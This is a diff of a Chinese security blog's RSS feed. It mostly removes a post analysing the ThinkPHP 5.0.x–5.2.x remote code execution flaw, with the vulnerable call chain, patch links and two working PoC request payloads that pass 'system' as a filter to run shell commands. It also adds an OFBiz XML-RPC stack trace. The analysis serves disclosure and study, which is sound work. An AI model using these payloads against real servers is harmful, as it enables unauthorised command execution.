+	at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
+	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?]
+	at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>Jenkins 路由解析及沙箱绕过漏洞分析报告(下)</title>
@@ -973,7 +1347,7 @@ assert mc(2) == 4
 &lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
 
 &lt;ol&gt;
-&lt;li&gt;&lt;p&gt;Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Dubbo 从大的层面上讲是RPC框架，负责封装RPC调用，支持很多RPC协议&lt;/p&gt;&lt;/li&gt;
 
 &lt;li&gt;&lt;p&gt;RPC协议包括了dubbo、rmi、hessian、webservice、http、redis、rest、thrift、memcached、jsonrpc等&lt;/p&gt;&lt;/li&gt;
 
@@ -3396,258 +3770,6 @@ $this-&amp;gt;image-&amp;gt;readImage( $filename );
 &lt;li&gt;&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&#34;&gt;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/WordPress/WordPress/commit/43bdb0e193955145a5ab1137890bb798bce5f0d2#diff-c3d5c535db5622f3b0242411ee5f9dfd&#34;&gt;https://github.com/WordPress/WordPress/commit/43bdb0e193955145a5ab1137890bb798bce5f0d2#diff-c3d5c535db5622f3b0242411ee5f9dfd&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析</title>
-      <link>https://kylingit.com/blog/thinkphp-5.0.x-5.0.235.1.x5.2.x-%E5%85%A8%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
-      <pubDate>Sat, 12 Jan 2019 14:18:20 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/thinkphp-5.0.x-5.0.235.1.x5.2.x-%E5%85%A8%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
-
-&lt;p&gt;1月11日，&lt;code&gt;ThinkPHP&lt;/code&gt;官方发布新版本&lt;code&gt;5.0.24&lt;/code&gt;，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是&lt;code&gt;ThinkPHP&lt;/code&gt;近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;公告&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://blog.thinkphp.cn/910675&#34;&gt;https://blog.thinkphp.cn/910675&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://blog.nsfocus.net/thinkphp-5-0-5-0-23-rce/&#34;&gt;http://blog.nsfocus.net/thinkphp-5-0-5-0-23-rce/&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h3&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;ThinkPHP 5.0.x ~ 5.0.23&lt;/p&gt;
-
-&lt;p&gt;ThinkPHP 5.1.x ~ 5.1.31&lt;/p&gt;
-
-&lt;p&gt;ThinkPHP 5.2.0beta1&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h3&gt;
-
-&lt;p&gt;选择&lt;code&gt;5.0.22&lt;/code&gt;完整版和&lt;code&gt;5.1.31&lt;/code&gt;版本进行复现分析&lt;/p&gt;
-
-&lt;h3 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h3&gt;
-
-&lt;h4 id=&#34;一-5-0-x-版本&#34;&gt;一、&lt;code&gt;5.0.x&lt;/code&gt;版本&lt;/h4&gt;
-
-&lt;p&gt;我们知道可以通过&lt;code&gt;http://127.0.0.1/public/index.php?s=index&lt;/code&gt;的方式通过&lt;code&gt;s&lt;/code&gt;参数传递具体的路由，具体调用如下&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;require __DIR__ . &#39;/../thinkphp/start.php&#39;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;start.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;App::run()-&amp;gt;send();
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;跟进&lt;code&gt;run()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112152929.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;可以看到在进入&lt;code&gt;self::exec($dispatch, $config)&lt;/code&gt;前，&lt;code&gt;$dispatch&lt;/code&gt;的值是通过&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;$dispatch = self::routeCheck($request, $config)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;设置的，这时候如果&lt;code&gt;debug&lt;/code&gt;模式开启，就会调用&lt;code&gt;$request-&amp;gt;param()&lt;/code&gt;，也就是下面&lt;code&gt;exec()&lt;/code&gt;中会调用到的函数，经过下面分析就能发现，在&lt;code&gt;debug&lt;/code&gt;模式开启时就能直接触发漏洞，原理是一样的。&lt;/p&gt;
-
-&lt;p&gt;进入&lt;code&gt;exec()&lt;/code&gt;方法看一下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153147.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;exec()&lt;/code&gt;方法根据&lt;code&gt;$dispatch&lt;/code&gt;的值选择进入不同的分支，当进入&lt;code&gt;method&lt;/code&gt;分支时，调用&lt;code&gt;Request::instance()-&amp;gt;param()&lt;/code&gt;方法，跟进&lt;code&gt;param()&lt;/code&gt;，看到调用了&lt;code&gt;Request&lt;/code&gt;类的&lt;code&gt;method()&lt;/code&gt;方法 ：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190114120946.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;其中&lt;code&gt;method()&lt;/code&gt;方法就是补丁修改的位置，在这个方法中，如果&lt;code&gt;method&lt;/code&gt;等于&lt;code&gt;true&lt;/code&gt;，则调用&lt;code&gt;$this-&amp;gt;server()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153449.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在&lt;code&gt;server()&lt;/code&gt;方法中调用&lt;code&gt;$this-&amp;gt;input&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154611.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;接着调用了&lt;code&gt;filterValue()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112154923.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;而&lt;code&gt;filterValue()&lt;/code&gt;则调用了&lt;code&gt;call_user_func()&lt;/code&gt;函数，如果两个参数均可控，则会造成命令执行：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112175411.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;此时的调用栈如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190114104035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;回头看一下&lt;code&gt;$filter&lt;/code&gt;和&lt;code&gt;$value&lt;/code&gt;参数从哪里来：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;$filter&lt;/code&gt;：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$filter = $this-&amp;gt;getFilter($filter, $default);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在&lt;code&gt;getFilter()&lt;/code&gt;中设置了&lt;code&gt;$filter&lt;/code&gt;值：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$filter = $filter ?: $this-&amp;gt;filter;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;也即由&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;决定&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;$value&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;code&gt;$value&lt;/code&gt;为第一个参数&lt;code&gt;$data&lt;/code&gt;，即为传入数组的值，由&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;决定&lt;/p&gt;
-
-&lt;p&gt;所以最终的问题就是如何从请求中传入&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;和&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;这两个值，构造&lt;code&gt;call_user_func()&lt;/code&gt;的参数触发漏洞。&lt;/p&gt;
-
-&lt;p&gt;回到最开始的&lt;code&gt;run()&lt;/code&gt;方法，其中：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$dispatch = self::routeCheck($request, $config);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;$dispatch&lt;/code&gt; 的值通过&lt;code&gt;routeCheck()&lt;/code&gt;方法设置，跟进&lt;code&gt;routeCheck()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112155407.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;调用了&lt;code&gt;check()&lt;/code&gt;方法：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112155704.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;check()&lt;/code&gt;方法中根据不同的&lt;code&gt;$rules&lt;/code&gt;值返回不同的结果，而&lt;code&gt;$rules&lt;/code&gt;的值由&lt;code&gt;$method&lt;/code&gt;决定，&lt;code&gt;$method&lt;/code&gt;则由&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;返回值取小写获得，所以再次回到&lt;code&gt;$request-&amp;gt;method()&lt;/code&gt;方法，这次没有参数&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153449.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;如果&lt;code&gt;$method&lt;/code&gt;不等于&lt;code&gt;true&lt;/code&gt;，则会取配置选项&lt;code&gt;var_method&lt;/code&gt;，该值为&lt;code&gt;_method&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112153759.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;然后调用&lt;code&gt;$this-&amp;gt;{$this-&amp;gt;method}($_POST);&lt;/code&gt;语句，此时假设我们控制了&lt;code&gt;$method&lt;/code&gt;的值，也就意味着可以调用&lt;code&gt;Request&lt;/code&gt;类的任意方法，而当调用构造方法&lt;code&gt;__construct()&lt;/code&gt;时，就可以覆盖&lt;code&gt;Request&lt;/code&gt;类的任意成员变量，也就是上面分析的&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;和&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;两个值，同时也可以覆盖&lt;code&gt;$this-&amp;gt;method&lt;/code&gt;，直接指定了&lt;code&gt;check()&lt;/code&gt;方法中的&lt;code&gt;$method&lt;/code&gt;值。&lt;/p&gt;
-
-&lt;h5 id=&#34;1-构造-poc&#34;&gt;1. 构造&lt;code&gt;PoC&lt;/code&gt;&lt;/h5&gt;
-
-&lt;p&gt;首先要主动触发&lt;code&gt;Request&lt;/code&gt;类的构造函数，通过参数&lt;code&gt;_method=__construct&lt;/code&gt;传入，进入到&lt;code&gt;__construct&lt;/code&gt;方法，该方法把参数遍历并设置值：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112163221.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;所以我们可以传入&lt;strong&gt;&lt;code&gt;filter=system&lt;/code&gt;&lt;/strong&gt;来设置&lt;code&gt;$this-&amp;gt;filter&lt;/code&gt;的值&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;此处&lt;code&gt;filter&lt;/code&gt;不是数组也可以，因为在&lt;code&gt;getFilter()&lt;/code&gt;中虽然对&lt;code&gt;filter&lt;/code&gt;是字符串的情况进行了按&lt;code&gt;,&lt;/code&gt;分割，但是传入一个值的情况下不影响最终的返回值&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;再看&lt;code&gt;$this-&amp;gt;server&lt;/code&gt;，在调用&lt;code&gt;$this-&amp;gt;server(&#39;REQUEST_METHOD&#39;)&lt;/code&gt;时指定了键值，所以通过传入&lt;code&gt;server&lt;/code&gt;数组即可&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;code&gt;server[REQUEST_METHOD]=id&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;然后我们注意到上面&lt;code&gt;check()&lt;/code&gt;方法，&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;它的返回值由&lt;code&gt;$rules&lt;/code&gt;决定，而&lt;code&gt;$rules&lt;/code&gt;的值取决于键值&lt;code&gt;$method&lt;/code&gt;，当我们指定&lt;code&gt;$method&lt;/code&gt;为&lt;code&gt;get&lt;/code&gt;时，可以正确获取到路由信息，从而通过&lt;code&gt;checkRoute()&lt;/code&gt;检查，此时我们通过指定&lt;strong&gt;&lt;code&gt;method=get&lt;/code&gt;&lt;/strong&gt;覆盖&lt;code&gt;$this-&amp;gt;method&lt;/code&gt;的值即可&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112173807.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;最终的&lt;code&gt;PoC&lt;/code&gt;：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;_method=__construct&amp;amp;filter=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=id&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112163746.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;调用栈如下图所示&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190112175904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h5 id=&#34;2-流程图&#34;&gt;2. 流程图&lt;/h5&gt;
-
-&lt;p&gt;整个漏洞的调用流程图如下所示：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190116110438.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;二-5-1-x-5-2-x-版本&#34;&gt;二、&lt;code&gt;5.1.x&lt;/code&gt;/&lt;code&gt;5.2.x&lt;/code&gt;版本&lt;/h4&gt;
-
-&lt;p&gt;在&lt;code&gt;5.1&lt;/code&gt;和&lt;code&gt;5.2&lt;/code&gt;版本上，这个变量覆盖依然存在，我们同样可以通过&lt;code&gt;_method&lt;/code&gt;参数覆盖&lt;code&gt;var_method&lt;/code&gt;，并最终执行到&lt;code&gt;Request::input()&lt;/code&gt;方法，通过&lt;code&gt;array_walk_recursive&lt;/code&gt;把传入的数组传给回调函数&lt;code&gt;filterValue&lt;/code&gt;，最终也是在&lt;code&gt;filterValue&lt;/code&gt;中完成命令执行，具体调用如下&lt;/p&gt;
-
-&lt;p&gt;当传入&lt;code&gt;_method&lt;/code&gt;参数为&lt;code&gt;filter&lt;/code&gt;时，覆盖了&lt;code&gt;Request&lt;/code&gt;原始的&lt;code&gt;filter&lt;/code&gt;成员，在经过路由检查进入&lt;code&gt;Request::instance()-&amp;gt;param()&lt;/code&gt;方法时，经过&lt;code&gt;$this-&amp;gt;method(true)调用，&lt;/code&gt;返回的&lt;code&gt;$method&lt;/code&gt;值为&lt;code&gt;POST&lt;/code&gt;，于是进入&lt;code&gt;post&lt;/code&gt;分支，调用&lt;code&gt;input()&lt;/code&gt;方法，由于第一个参数为空，返回我们传入的&lt;code&gt;post&lt;/code&gt;值&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190116095414.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;然后把数组合并到&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;，接着再次调用&lt;code&gt;input()&lt;/code&gt;方法，经过&lt;code&gt;$this-&amp;gt;getFilter&lt;/code&gt;返回&lt;code&gt;filter&lt;/code&gt;值，由于此时&lt;code&gt;$data&lt;/code&gt;是一个数组(即&lt;code&gt;$this-&amp;gt;param&lt;/code&gt;)，于是进入&lt;code&gt;if&lt;/code&gt;分支，经过&lt;code&gt;array_walk_recursive()&lt;/code&gt;函数把数组传给回调函数&lt;code&gt;filterValue&lt;/code&gt;，遍历键值后同样由&lt;code&gt;call_user_func&lt;/code&gt;完成命令执行&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (is_array($data)) {
-    array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
-    if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&amp;lt;&#39;)) {
-        // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
-        $this-&amp;gt;arrayReset($data);
-    }
-} else {
-    $this-&amp;gt;filterValue($data, $name, $filter);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h5 id=&#34;1-构造-poc-1&#34;&gt;1. 构造&lt;code&gt;PoC&lt;/code&gt;&lt;/h5&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;a=system&amp;amp;b=id&amp;amp;_method=filter
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;需要在程序加入忽略异常提示：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;error_reporting(0);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;调用栈如图&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190116095551.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h5 id=&#34;2-流程图-1&#34;&gt;2. 流程图&lt;/h5&gt;
-
-&lt;p&gt;&lt;code&gt;5.1.x&lt;/code&gt;版本的漏洞调用流程图如下所示：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190116104019.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x05-补丁分析&#34;&gt;0x05 补丁分析&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190114134401.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在三个版本的更新补丁中，限制了&lt;code&gt;$this-&amp;gt;method&lt;/code&gt;为&lt;code&gt;GET&lt;/code&gt;，&lt;code&gt;POST&lt;/code&gt;，&lt;code&gt;DELETE&lt;/code&gt;，&lt;code&gt;PUT&lt;/code&gt;，&lt;code&gt;PATCH&lt;/code&gt;这几个方法，因此不能从外部传入方法名再调用&lt;code&gt;Request&lt;/code&gt;类的任意方法或是覆盖原有变量。&lt;/p&gt;
-
-&lt;p&gt;补丁链接：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;5.0.24：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003&#34;&gt;https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;5.1.31：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6&#34;&gt;https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;5.2-beta.2：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/top-think/framework/commit/7c24500e463704583e0778b7ec6efce607ddef5f&#34;&gt;https://github.com/top-think/framework/commit/7c24500e463704583e0778b7ec6efce607ddef5f&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;
-
-&lt;p&gt;这三漏洞本质上都是变量覆盖漏洞，在一处存在缺陷的方法中没有对用户输入做严格判断，通过传递&lt;code&gt;_method&lt;/code&gt;参数覆盖了配置文件的&lt;code&gt;_method&lt;/code&gt;，导致可以访问&lt;code&gt;Request&lt;/code&gt;类的任意函数，而在&lt;code&gt;Request&lt;/code&gt;的构造函数中又创建了恶意的成员变量，导致后面的命令执行；而在&lt;code&gt;5.1&lt;/code&gt;和&lt;code&gt;5.2&lt;/code&gt;版本中则是直接覆盖了过滤器，在忽略运行异常的情况下会触发漏洞，整个利用链可以说是非常巧妙了。&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
